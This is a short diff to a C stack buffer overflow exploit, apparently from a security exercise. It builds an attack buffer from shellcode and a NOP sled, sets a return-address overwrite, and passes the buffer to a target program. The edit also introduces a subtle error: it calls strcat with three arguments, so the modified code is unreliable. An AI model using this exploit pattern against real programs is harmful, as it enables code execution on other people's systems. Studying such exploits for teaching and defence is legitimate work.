@@ -18,7 +18,7 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 	unsigned char attack_buffer[BUF_SIZE];
 
-	strcat(attack_buffer, shellcode);
+	strcat(attack_buffer, shellcode, SHELL_SIZE);
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
@@ -29,10 +29,6 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 4] = '\0';
 
 	printf("attack_buffer %s\n",attack_buffer);
-	printf("%x\t%x\t%x\t%x\n",attack_buffer[BUF_TO_RET],
-						attack_buffer[BUF_TO_RET + 1],
-						attack_buffer[BUF_TO_RET + 2],
-						attack_buffer[BUF_TO_RET + 3]);
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
